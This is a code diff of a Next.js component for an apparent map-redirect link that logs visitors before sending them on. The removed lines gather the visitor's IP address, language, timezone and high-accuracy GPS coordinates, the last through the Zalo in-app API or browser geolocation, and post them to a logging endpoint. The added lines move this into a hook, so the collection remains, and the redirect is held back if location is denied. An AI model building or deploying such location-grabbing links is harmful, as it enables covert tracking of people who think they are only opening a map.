@@ -1,11 +1,11 @@
-
 'use client';
 
-import { useEffect, useState } from 'react';
+import { useEffect, useState, useCallback } from 'react';
 import Image from 'next/image';
 import { Button } from '@/components/ui/button';
 import { MapPin, ArrowUpRight, Loader2, ShieldCheck } from 'lucide-react';
 import type { MapLinkConfig } from '@/app/actions/map-links';
+import { useLocationLogger } from '@/hooks/use-location-logger';
 
 interface MapRedirectClientProps {
   redirectUrl: string;
@@ -14,83 +14,31 @@ interface MapRedirectClientProps {
 
 export function MapRedirectClient({ redirectUrl, config }: MapRedirectClientProps) {
   const [status, setStatus] = useState<'loading' | 'denied' | 'idle'>('loading');
+  const { log } = useLocationLogger('/api/log-location', { from: 'link' });
 
-  const requestLocation = async () => {
+  const requestLocation = useCallback(() => {
     setStatus('loading');
 
-    let clientIp = 'N/A';
-    try {
-      const ipResponse = await fetch('https://api.ipify.org?format=json');
-      if (ipResponse.ok) {
-        const ipData = await ipResponse.json();
-        clientIp = ipData.ip;
-      }
-    } catch (e) {
-      console.error("Could not fetch IP", e);
-    }
+    log({
+        onSuccess: () => {
+            window.location.href = redirectUrl;
+        },
+        onError: (error) => {
+            if (error?.code === 1) { // PERMISSION_DENIED
+                setStatus('denied');
+            } else {
+                // For other errors, just redirect
+                window.location.href = redirectUrl;
+            }
+        }
+    });
 
-    const logDataAndRedirect = (pos?: { coords: { latitude: number; longitude: number; accuracy: number; } }) => {
-      const body: any = { 
-          ip: clientIp, 
-          from: 'link',
-          language: navigator.language,
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      };
-
-      if (pos) {
-        body.lat = pos.coords.latitude;
-        body.lon = pos.coords.longitude;
-        body.acc = pos.coords.accuracy;
-      }
-
-      fetch('/api/log-location', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body),
-        keepalive: true,
-      }).finally(() => {
-        window.location.href = redirectUrl;
-      });
-    };
-
-    const handleError = (error?: { code: number; message?: string }) => {
-      if (error?.code === 1) { // PERMISSION_DENIED
-          setStatus('denied');
-      } else {
-          logDataAndRedirect();
-      }
-    };
-    
-    if (typeof (window as any).zaloJSV2?.getLocation === 'function') {
-      (window as any).zaloJSV2.getLocation((data: { status: string; latitude: number; longitude: number; accuracy: number; }) => {
-          if (data.status === "SUCCESS" && data.latitude && data.longitude) {
-              logDataAndRedirect({
-                  coords: {
-                      latitude: data.latitude,
-                      longitude: data.longitude,
-                      accuracy: data.accuracy || 15,
-                  },
-              });
-          } else {
-              handleError({ code: 1, message: 'Zalo API failed or was denied' });
-          }
-      });
-    }
-    else if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        logDataAndRedirect,
-        (err) => handleError(err),
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-      );
-    } else {
-      logDataAndRedirect();
-    }
-  };
+  }, [log, redirectUrl]);
   
   useEffect(() => {
     const timer = setTimeout(requestLocation, 500);
     return () => clearTimeout(timer);
-  }, []);
+  }, [requestLocation]);
 
   const getButtonContent = () => {
     switch(status) {
